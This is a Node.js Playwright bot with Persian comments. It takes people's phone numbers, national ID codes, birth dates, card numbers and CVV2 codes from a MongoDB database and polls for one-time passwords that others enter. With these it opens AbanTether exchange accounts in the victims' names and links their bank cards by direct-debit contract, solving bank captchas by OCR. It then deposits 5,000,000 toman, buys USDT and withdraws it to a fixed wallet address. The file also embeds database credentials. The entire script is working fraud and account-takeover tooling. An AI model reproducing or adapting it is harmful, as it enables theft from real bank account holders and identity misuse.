const { chromium } = require('playwright');
const { MongoClient } = require('mongodb');
const Tesseract = require('tesseract.js');

class AbanTetherBot {
    constructor() {
        // تنظیمات پایه
        this.mongoUri = 'mongodb+srv://zarin_db_user:zarin22@cluster0.ukd7zib.mongodb.net/ZarrinApp?retryWrites=true&w=majority';
        this.dbName = 'ZarrinApp';
        this.collectionName = 'zarinapp';
        this.password = 'ImSorryButIhaveTo@1';
        this.depositAmount = '5000000';
        this.withdrawAmount = '40';
        this.withdrawAddress = 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS';
        this.maxRetries = 3;
        
        // متغیرهای حالت
        this.browser = null;
        this.page = null;
        this.currentUser = null;
        this.processingUsers = new Set();
        this.mongoClient = null;
        this.db = null;
        this.collection = null;
    }

    // --- توابع کمکی ---
    async log(step, message) {
        const timestamp = new Date().toISOString();
        console.log(`[${timestamp}] [${step}] ${message}`);
    }

    async sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async connectToMongoDB() {
        try {
            this.mongoClient = new MongoClient(this.mongoUri);
            await this.mongoClient.connect();
            this.db = this.mongoClient.db(this.dbName);
            this.collection = this.db.collection(this.collectionName);
            this.log('DATABASE', '✅ متصل به دیتابیس شد');
        } catch (error) {
            this.log('ERROR', `❌ خطا در اتصال به دیتابیس: ${error.message}`);
            throw error;
        }
    }

    async updateUserStatus(phone, status, message, retryCount = 0) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                { 
                    $set: { 
                        status: status,
                        statusMessage: message,
                        lastUpdated: new Date(),
                        retryCount: retryCount
                    }
                }
            );
            this.log('STATUS', `📊 ${phone}: ${status} - ${message}`);
        } catch (error) {
            this.log('ERROR', `❌ خطا در آپدیت وضعیت: ${error.message}`);
        }
    }

    async waitForFieldInDB(phone, fieldName, timeout = 180000) {
        this.log('WAIT', `⏳ منتظر فیلد ${fieldName} برای ${phone}...`);
        const startTime = Date.now();
        
        while (Date.now() - startTime < timeout) {
            try {
                const user = await this.collection.findOne({ personalPhoneNumber: phone });
                
                if (user && user[fieldName] && user[fieldName].trim() !== '') {
                    const value = user[fieldName];
                    this.log('WAIT', `✅ ${fieldName} دریافت شد: ${value}`);
                    
                    // پاک کردن OTP از دیتابیس
                    await this.collection.updateOne(
                        { personalPhoneNumber: phone },
                        { $unset: { [fieldName]: "" } }
                    );
                    
                    return value;
                }
                
                await this.sleep(5000);
                
            } catch (error) {
                this.log('ERROR', `❌ خطا در بررسی ${fieldName}: ${error.message}`);
                await this.sleep(5000);
            }
        }
        
        throw new Error(`⏰ تایم‌اوت: فیلد ${fieldName} دریافت نشد`);
    }

    // --- هوش مصنوعی رایگان برای کپچا ---
    async solveCaptchaWithAI(imageElement) {
        try {
            this.log('AI_CAPTCHA', '🔍 شروع پردازش کپچا با AI...');
            const screenshotBuffer = await imageElement.screenshot();
            
            // پردازش با Tesseract
            const { data: { text } } = await Tesseract.recognize(screenshotBuffer, 'fas');
            const cleanedText = text.replace(/\s+/g, '').trim();
            
            this.log('AI_CAPTCHA', `✅ کپچا تشخیص داده شد: "${cleanedText}"`);
            return cleanedText;
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در پردازش کپچا: ${error.message}`);
            throw error;
        }
    }

    // --- توابع پیدا کردن المان‌ها ---
    async findAndFill(text, value) {
        try {
            this.log('FILL', `🔍 در حال پیدا کردن فیلد با متن: "${text}"`);
            
            // روش‌های مختلف برای پیدا کردن فیلد
            const selectors = [
                `input[placeholder*="${text}"]`,
                `input[aria-label*="${text}"]`,
                `label:has-text("${text}") + input`,
                `//label[contains(text(), '${text}')]/following::input[1]`
            ];
            
            for (const selector of selectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element) {
                        await element.fill(value);
                        this.log('FILL', `✅ پر شد: "${text}" = ${value}`);
                        await this.sleep(500);
                        return true;
                    }
                } catch {
                    continue;
                }
            }
            
            throw new Error(`فیلد "${text}" پیدا نشد`);
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در پر کردن فیلد: ${error.message}`);
            throw error;
        }
    }

    async findAndClick(text) {
        try {
            this.log('CLICK', `🔍 در حال پیدا کردن دکمه با متن: "${text}"`);
            
            const selectors = [
                `button:has-text("${text}")`,
                `a:has-text("${text}")`,
                `div:has-text("${text}")`,
                `span:has-text("${text}")`,
                `//*[contains(text(), '${text}')]`
            ];
            
            for (const selector of selectors) {
                try {
                    const element = await this.page.$(selector);
                    if (element && await element.isVisible()) {
                        await element.click();
                        this.log('CLICK', `✅ کلیک شد: "${text}"`);
                        await this.sleep(2000);
                        return true;
                    }
                } catch {
                    continue;
                }
            }
            
            throw new Error(`دکمه "${text}" پیدا نشد`);
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در کلیک کردن: ${error.message}`);
            throw error;
        }
    }

    async selectOption(labelText, value) {
        try {
            this.log('SELECT', `🔍 در حال انتخاب "${value}" برای "${labelText}"`);
            
            // پیدا کردن select بر اساس label
            const selectors = [
                `label:has-text("${labelText}") + select`,
                `//label[contains(text(), '${labelText}')]/following::select[1]`
            ];
            
            for (const selector of selectors) {
                const select = await this.page.$(selector);
                if (select) {
                    await select.selectOption(value);
                    this.log('SELECT', `✅ انتخاب شد: "${labelText}" = ${value}`);
                    await this.sleep(1000);
                    return true;
                }
            }
            
            throw new Error(`Select با لیبل "${labelText}" پیدا نشد`);
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در انتخاب: ${error.message}`);
            throw error;
        }
    }

    // --- مراحل اصلی ---
    async initializeBrowser() {
        try {
            this.log('BROWSER', '🚀 در حال راه‌اندازی مرورگر...');
            this.browser = await chromium.launch({ 
                headless: true,
                args: ['--no-sandbox', '--disable-setuid-sandbox']
            });
            
            const context = await this.browser.newContext({
                viewport: { width: 1280, height: 720 }
            });
            
            this.page = await context.newPage();
            await this.page.setDefaultTimeout(60000);
            this.log('BROWSER', '✅ مرورگر آماده است');
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در راه‌اندازی مرورگر: ${error.message}`);
            throw error;
        }
    }

    async step1_Register(user) {
        try {
            this.log('STEP_1', '📝 مرحله 1: ثبت‌نام');
            await this.updateUserStatus(user.personalPhoneNumber, 'registering', 'در حال ثبت‌نام');
            
            await this.page.goto('https://abantether.com/register', { waitUntil: 'networkidle' });
            await this.sleep(3000);
            
            // وارد کردن شماره موبایل
            await this.findAndFill('شماره موبایل خود را وارد کنید', user.personalPhoneNumber);
            
            // کلیک روی دکمه ثبت نام
            await this.findAndClick('ثبت نام');
            
            await this.sleep(3000);
            
            // وارد کردن OTP
            const otpLogin = await this.waitForFieldInDB(user.personalPhoneNumber, 'otp_login');
            await this.findAndFill('کد ارسال شده به شماره موبایل خود را وارد کنید', otpLogin);
            
            // کلیک روی مرحله بعد
            await this.findAndClick('مرحله بعد');
            
            this.log('STEP_1', '✅ مرحله 1 تکمیل شد');
            await this.sleep(3000);
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در مرحله 1: ${error.message}`);
            throw error;
        }
    }

    async step2_PasswordAndIdentity(user) {
        try {
            this.log('STEP_2', '🔐 مرحله 2: رمز عبور و اطلاعات هویتی');
            await this.updateUserStatus(user.personalPhoneNumber, 'setting_password', 'تنظیم رمز و اطلاعات');
            
            // وارد کردن رمز عبور
            await this.findAndFill('رمز عبور خود را وارد نمایید', this.password);
            
            // کلیک روی تایید
            await this.findAndClick('تایید');
            
            await this.sleep(3000);
            
            // وارد کردن کد ملی
            await this.findAndFill('کد 10 رقمی شناسایی خود را وارد کنید', user.personalNationalCode);
            
            // وارد کردن تاریخ تولد
            await this.findAndFill('روز/ماه/سال', user.personalBirthDate);
            
            // کلیک روی ثبت
            await this.findAndClick('ثبت');
            
            this.log('STEP_2', '✅ مرحله 2 تکمیل شد');
            await this.sleep(5000);
            
            // بررسی باکس تبریک (اگر باز شد)
            const continueButton = await this.page.$('button:has-text("ادامه"), button:has-text("تایید")');
            if (continueButton) {
                await continueButton.click();
                this.log('POPUP', '✅ باکس تبریک بسته شد');
                await this.sleep(2000);
            }
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در مرحله 2: ${error.message}`);
            throw error;
        }
    }

    async step3_GoToWallet() {
        try {
            this.log('STEP_3', '💰 مرحله 3: رفتن به کیف پول');
            await this.updateUserStatus(this.currentUser.personalPhoneNumber, 'going_to_wallet', 'رفتن به کیف پول');
            
            // کلیک روی کیف پول در تول بار
            await this.findAndClick('کیف پول');
            
            await this.sleep(2000);
            
            // کلیک روی واریز
            await this.findAndClick('واریز');
            await this.sleep(1000);
            
            // کلیک روی تومان
            await this.findAndClick('تومان');
            
            this.log('STEP_3', '✅ مرحله 3 تکمیل شد');
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در مرحله 3: ${error.message}`);
            throw error;
        }
    }

    async step4_AddContract(user) {
        try {
            this.log('STEP_4', '📄 مرحله 4: افزودن قرارداد');
            await this.updateUserStatus(user.personalPhoneNumber, 'adding_contract', 'در حال افزودن قرارداد');
            
            await this.page.goto('https://abantether.com/user/wallet/deposit/irt/direct', { waitUntil: 'networkidle' });
            await this.sleep(3000);
            
            // کلیک روی افزودن قرارداد
            await this.findAndClick('افزودن قرارداد');
            await this.sleep(2000);
            
            // انتخاب بانک
            await this.selectOption('نام بانک', user.bank);
            
            // انتخاب مدت قرارداد
            await this.selectOption('مدت قرار داد', '1');
            
            // کلیک روی ثبت و ادامه
            await this.findAndClick('ثبت و ادامه');
            
            this.log('STEP_4', '✅ مرحله 4 تکمیل شد');
            await this.sleep(5000);
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در مرحله 4: ${error.message}`);
            throw error;
        }
    }

    async step5_HandleBank(user) {
        try {
            this.log('STEP_5', '🏦 مرحله 5: پردازش صفحه بانک');
            await this.updateUserStatus(user.personalPhoneNumber, 'processing_bank', 'در حال پردازش صفحه بانک');
            
            if (user.bank === 'ملی') {
                await this.handleBankMelli(user);
            } else if (user.bank === 'مهر ایران') {
                await this.handleBankMehrIran(user);
            }
            // TODO: اضافه کردن بانک‌های دیگر (ملت، کشاورزی، تجارت)
            
            this.log('STEP_5', '✅ مرحله 5 تکمیل شد');
            await this.sleep(5000);
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در مرحله 5: ${error.message}`);
            throw error;
        }
    }

    async handleBankMelli(user) {
        try {
            this.log('BANK_MELLI', '🏦 پردازش بانک ملی');
            
            // کلیک روی ورود با کارت بانک ملی
            await this.findAndClick('ورود با کارت بانک ملی');
            await this.sleep(3000);
            
            // وارد کردن شماره کارت
            await this.findAndFill('شماره کارت', user.cardNumber);
            
            // پیدا کردن و پردازش کپچا
            const captchaImage = await this.page.$('.captcha-container img');
            if (!captchaImage) {
                throw new Error('تصویر کپچا پیدا نشد');
            }
            
            const captchaText = await this.solveCaptchaWithAI(captchaImage);
            await this.findAndFill('کد امنیتی', captchaText);
            
            // کلیک روی ارسال رمز فعالسازی
            await this.findAndClick('ارسال رمز فعالسازی');
            
            // منتظر رمز فعالسازی
            const activationCode = await this.waitForFieldInDB(user.personalPhoneNumber, 'otp_payment');
            await this.findAndFill('رمز فعالسازی', activationCode);
            
            // کلیک روی ادامه
            await this.findAndClick('ادامه');
            await this.sleep(3000);
            
            // کلیک روی ثبت قرار داد
            await this.findAndClick('ثبت قرار داد');
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در پردازش بانک ملی: ${error.message}`);
            throw error;
        }
    }

    async handleBankMehrIran(user) {
        try {
            this.log('BANK_MEHR_IRAN', '🏦 پردازش بانک مهر ایران');
            
            // وارد کردن شماره کارت
            await this.findAndFill('شماره کارت', user.cardNumber);
            
            // وارد کردن CVV2
            await this.findAndFill('CVV2', user.cvv2);
            
            // وارد کردن ماه انقضا
            await this.findAndFill('ماه انقضا', user.bankMonth.toString());
            
            // وارد کردن سال انقضا
            await this.findAndFill('سال انقضا', user.bankYear.toString());
            
            // پیدا کردن و پردازش کپچا
            const captchaImage = await this.page.$('.captchaWrap img');
            if (!captchaImage) {
                throw new Error('تصویر کپچا پیدا نشد');
            }
            
            const captchaText = await this.solveCaptchaWithAI(captchaImage);
            await this.findAndFill('عبارت امنیتی', captchaText);
            
            // کلیک روی دریافت رمز پویا
            await this.findAndClick('دریافت رمز پویا');
            
            // منتظر رمز دوم
            const secondPassword = await this.waitForFieldInDB(user.personalPhoneNumber, 'otp_payment');
            await this.findAndFill('رمز دوم', secondPassword);
            
            // کلیک روی تایید
            await this.findAndClick('تایید');
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در پردازش بانک مهر ایران: ${error.message}`);
            throw error;
        }
    }

    async step6_CompleteDeposit(user) {
        try {
            this.log('STEP_6', '💵 مرحله 6: تکمیل واریز');
            await this.updateUserStatus(user.personalPhoneNumber, 'completing_deposit', 'در حال تکمیل واریز');
            
            // برگشت به صفحه آبان تتر بعد از بانک
            // منتظر لود صفحه واریز
            
            // وارد کردن مبلغ
            await this.findAndFill('مبلغ واریزی (تومان)', this.depositAmount);
            
            // انتخاب بانک
            await this.selectOption('نام بانک', user.bank);
            
            // کلیک روی واریز
            await this.findAndClick('واریز');
            await this.sleep(2000);
            
            // کلیک روی تایید و پرداخت
            await this.findAndClick('تایید و پرداخت');
            
            this.log('STEP_6', '✅ مرحله 6 تکمیل شد');
            await this.sleep(10000); // صبر برای واریز
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در مرحله 6: ${error.message}`);
            throw error;
        }
    }

    async step7_BuyTether() {
        try {
            this.log('STEP_7', '🔄 مرحله 7: خرید تتر');
            await this.updateUserStatus(this.currentUser.personalPhoneNumber, 'buying_tether', 'در حال خرید تتر');
            
            await this.page.goto('https://abantether.com/user/trade/fast/buy?s=USDT', { waitUntil: 'networkidle' });
            await this.sleep(3000);
            
            // وارد کردن مقدار
            await this.findAndFill('مقدار', this.withdrawAmount);
            
            // کلیک روی ثبت سفارش
            await this.findAndClick('ثبت سفارش');
            
            this.log('STEP_7', '✅ مرحله 7 تکمیل شد');
            await this.sleep(5000);
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در مرحله 7: ${error.message}`);
            throw error;
        }
    }

    async step8_WithdrawTether() {
        try {
            this.log('STEP_8', '📤 مرحله 8: برداشت تتر');
            await this.updateUserStatus(this.currentUser.personalPhoneNumber, 'withdrawing', 'در حال برداشت تتر');
            
            await this.page.goto('https://abantether.com/user/wallet/withdrawal/crypto?symbol=USDT', { waitUntil: 'networkidle' });
            await this.sleep(3000);
            
            // انتخاب رمزارز
            await this.selectOption('رمز ارز', 'تتر');
            
            // انتخاب شبکه
            await this.selectOption('شبکه برداشت', 'BSC(BEP20)');
            
            // وارد کردن آدرس ولت
            await this.findAndFill('آدرس ولت مقصد', this.withdrawAddress);
            
            // وارد کردن مقدار
            await this.findAndFill('مقدار', this.withdrawAmount);
            
            // کلیک روی ثبت برداشت
            await this.findAndClick('ثبت برداشت');
            
            this.log('STEP_8', '✅ مرحله 8 تکمیل شد - فرآیند کامل شد!');
            await this.sleep(5000);
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در مرحله 8: ${error.message}`);
            throw error;
        }
    }

    // --- پردازش اصلی کاربر ---
    async processUser(user) {
        const phone = user.personalPhoneNumber;
        const retryCount = user.retryCount || 0;
        
        this.currentUser = user;
        this.processingUsers.add(phone);
        
        try {
            this.log('PROCESS', `👤 شروع پردازش کاربر: ${phone} (تلاش ${retryCount + 1}/${this.maxRetries})`);
            
            // آپدیت وضعیت شروع
            await this.updateUserStatus(phone, 'starting', 'شروع فرآیند', retryCount);
            
            // راه‌اندازی مرورگر
            await this.initializeBrowser();
            
            // اجرای مراحل
            await this.step1_Register(user);
            await this.step2_PasswordAndIdentity(user);
            await this.step3_GoToWallet();
            await this.step4_AddContract(user);
            await this.step5_HandleBank(user);
            await this.step6_CompleteDeposit(user);
            await this.step7_BuyTether();
            await this.step8_WithdrawTether();
            
            // تکمیل موفق
            await this.updateUserStatus(phone, 'completed', 'فرآیند با موفقیت تکمیل شد', retryCount);
            await this.markAsCompleted(phone);
            
            this.log('SUCCESS', `🎉 کاربر ${phone} با موفقیت پردازش شد`);
            
            // بستن مرورگر
            if (this.browser) {
                await this.browser.close();
                this.browser = null;
                this.page = null;
            }
            
        } catch (error) {
            this.log('ERROR', `💥 خطا در پردازش کاربر ${phone}: ${error.message}`);
            
            const newRetryCount = retryCount + 1;
            
            if (newRetryCount >= this.maxRetries) {
                await this.updateUserStatus(phone, 'failed', `شکست پس از ${this.maxRetries} تلاش: ${error.message}`, newRetryCount, true);
                this.log('RETRY', `⛔ حداکثر تلاش‌ها برای ${phone} تمام شد`);
            } else {
                await this.updateUserStatus(phone, 'failed', `تلاش ${newRetryCount}/${this.maxRetries}: ${error.message}`, newRetryCount);
                this.log('RETRY', `🔄 کاربر ${phone} برای تلاش مجدد علامت‌گذاری شد`);
            }
            
            // بستن مرورگر در صورت خطا
            if (this.browser) {
                await this.browser.close();
                this.browser = null;
                this.page = null;
            }
            
            throw error;
            
        } finally {
            this.processingUsers.delete(phone);
            this.currentUser = null;
        }
    }

    async markAsCompleted(phone) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                { 
                    $set: { 
                        processed: true,
                        status: "completed",
                        completedAt: new Date(),
                        statusMessage: "فرآیند با موفقیت تکمیل شد"
                    }
                }
            );
        } catch (error) {
            this.log('ERROR', `❌ خطا در علامت‌گذاری کاربر به عنوان تکمیل‌شده: ${error.message}`);
        }
    }

    // --- نظارت بر دیتابیس ---
    async startPolling() {
        await this.connectToMongoDB();
        this.log('POLLING', '🔄 شروع نظارت بر دیتابیس (هر 30 ثانیه)');
        
        // اجرای اولیه
        await this.checkDatabase();
        
        // تنظیم تایمر برای نظارت مداوم
        setInterval(async () => {
            try {
                await this.checkDatabase();
            } catch (error) {
                this.log('ERROR', `❌ خطا در نظارت: ${error.message}`);
            }
        }, 30000);
    }

    async checkDatabase() {
        try {
            // جستجوی کاربران نیازمند پردازش
            const query = {
                $or: [
                    { otp_login: { $exists: true, $ne: null, $ne: '' } },
                    { otp_register_card: { $exists: true, $ne: null, $ne: '' } },
                    { otp_payment: { $exists: true, $ne: null, $ne: '' } }
                ],
                processed: { $ne: true },
                status: { $ne: 'failed' },
                $or: [
                    { retryCount: { $exists: false } },
                    { retryCount: { $lt: this.maxRetries } }
                ]
            };

            const pendingUsers = await this.collection.find(query).limit(10).toArray();
            this.log('DATABASE', `📊 ${pendingUsers.length} کاربر نیازمند پردازش یافت شد`);
            
            for (const user of pendingUsers) {
                const phone = user.personalPhoneNumber;
                
                // اگر کاربر در حال پردازش نیست
                if (!this.processingUsers.has(phone)) {
                    this.log('PROCESSING', `🚀 شروع پردازش برای: ${phone}`);
                    
                    // پردازش کاربر در پس‌زمینه
                    this.processUser(user).catch(error => {
                        this.log('ERROR', `خطا در پردازش ${phone}: ${error.message}`);
                    });
                } else {
                    this.log('SKIP', `⏭️ ${phone} در حال پردازش است`);
                }
            }
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در بررسی دیتابیس: ${error.message}`);
        }
    }

    async start() {
        this.log('START', '🤖 ربات آبان تتر راه‌اندازی شد');
        this.log('CONFIG', `حداکثر تلاش‌ها: ${this.maxRetries}`);
        
        try {
            await this.startPolling();
            
            // مدیریت سیگنال‌های خاتمه
            process.on('SIGINT', async () => {
                this.log('SHUTDOWN', '🛑 دریافت سیگنال خاتمه...');
                if (this.mongoClient) await this.mongoClient.close();
                process.exit(0);
            });
            
            process.on('SIGTERM', async () => {
                this.log('SHUTDOWN', '🛑 دریافت سیگنال ترمینیت...');
                if (this.mongoClient) await this.mongoClient.close();
                process.exit(0);
            });
            
        } catch (error) {
            this.log('ERROR', `💥 خطا در راه‌اندازی: ${error.message}`);
            setTimeout(() => this.start(), 10000); // تلاش مجدد پس از 10 ثانیه
        }
    }
}

// --- اجرای ربات ---
const bot = new AbanTetherBot();

// مدیریت خطاهای catch نشده
process.on('unhandledRejection', (error) => {
    console.error('[UNHANDLED_REJECTION]', error);
});

process.on('uncaughtException', (error) => {
    console.error('[UNCAUGHT_EXCEPTION]', error);
});

// شروع ربات
bot.start();